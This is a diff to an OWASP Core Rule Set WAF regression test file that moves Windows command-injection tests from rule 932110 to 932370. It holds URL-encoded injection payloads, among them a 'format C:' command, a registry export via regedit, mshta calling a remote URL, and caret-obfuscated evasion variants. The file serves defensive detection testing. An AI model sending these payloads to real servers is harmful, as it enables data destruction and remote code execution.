@@ -3,9 +3,9 @@ meta:
   author: airween, Franziska Bühler
   description: "Remote Command Execution: Windows Command Injection test cases"
   enabled: true
-  name: 932110.yaml
+  name: 932370.yaml
 tests:
-  - test_title: 932110-1
+  - test_title: 932370-1
     desc: "Windows Command Injection true positive test"
     stages:
       - stage:
@@ -17,12 +17,12 @@ tests:
               User-Agent: "OWASP ModSecurity Core Rule Set"
             method: GET
             port: 80
-            # "cmd=; format C:"
-            uri: /?cmd=%3B%20format%20C%3A
+            # "cmd=; regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey"
+            uri: /get?cmd%3D%3B%20regedit%20%2FE%20c%3A%5Cads%5Cfile.txt%3Aregfile.reg%20HKEY_CURRENT_USER%5CMyCustomRegKey
             version: HTTP/1.0
           output:
-            log_contains: id "932110"
-  - test_title: 932110-2
+            log_contains: id "932370"
+  - test_title: 932370-2
     desc: "Windows Command Injection true negative test"
     stages:
       - stage:
@@ -34,12 +34,12 @@ tests:
               User-Agent: "OWASP ModSecurity Core Rule Set"
             method: GET
             port: 80
-            # "cmd=format "
-            uri: /?cmd=format%20
+            # "cmd=regedit "
+            uri: /get?cmd=regedit%20
             version: HTTP/1.0
           output:
-            no_log_contains: id "932110"
-  - test_title: 932110-3
+            no_log_contains: id "932370"
+  - test_title: 932370-3
     desc: "Windows Command Injection - bypass test"
     stages:
       - stage:
@@ -52,11 +52,11 @@ tests:
             method: GET
             port: 80
             # "cmd=; mshta http://example.com"
-            uri: /?cmd=;%20mshta%20http://example.com
+            uri: /get?cmd=;%20mshta%20http://example.com
             version: HTTP/1.0
           output:
-            log_contains: id "932110"
-  - test_title: 932110-4
+            log_contains: id "932370"
+  - test_title: 932370-4
     desc: Windows Command Injection bypass with time
     stages:
       - stage:
@@ -70,11 +70,11 @@ tests:
               Accept-Language: en-us,en;q=0.5
             method: GET
             port: 80
-            uri: "/?foo=time+cmd"
+            uri: "/get?foo=time+cmd"
             version: HTTP/1.1
           output:
-            log_contains: "id \"932110\""
-  - test_title: 932110-5
+            log_contains: id "932370"
+  - test_title: 932370-5
     desc: Windows Command Injection bypass with time negative test
     stages:
       - stage:
@@ -88,11 +88,11 @@ tests:
               Accept-Language: en-us,en;q=0.5
             method: GET
             port: 80
-            uri: "/?foo=time+warner+"
+            uri: "/get?foo=time+warner+"
             version: HTTP/1.1
           output:
-            no_log_contains: "id \"932110\""
-  - test_title: 932110-6
+            no_log_contains: id "932370"
+  - test_title: 932370-6
     desc: Windows Command Injection test for BB finding 935E1D91
     stages:
       - stage:
@@ -106,11 +106,11 @@ tests:
               Accept-Language: en-us,en;q=0.5
             method: GET
             port: 80
-            uri: "/?foo=time+curl+coreruleset.org"
+            uri: "/?foo=time+winget+coreruleset.org"
             version: HTTP/1.1
           output:
-            log_contains: "id \"932110\""
-  - test_title: 932110-7
+            log_contains: id "932370"
+  - test_title: 932370-7
     desc: Windows Command Injection test for BB finding 935E1D91 - evasion attempt
     stages:
       - stage:
@@ -124,7 +124,7 @@ tests:
               Accept-Language: en-us,en;q=0.5
             method: GET
             port: 80
-            uri: "/?foo=ti^me+curl+coreruleset.org"
+            uri: "/?foo=ti^me+winget+coreruleset.org"
             version: HTTP/1.1
           output:
-            log_contains: "id \"932110\""
+            log_contains: id "932370"
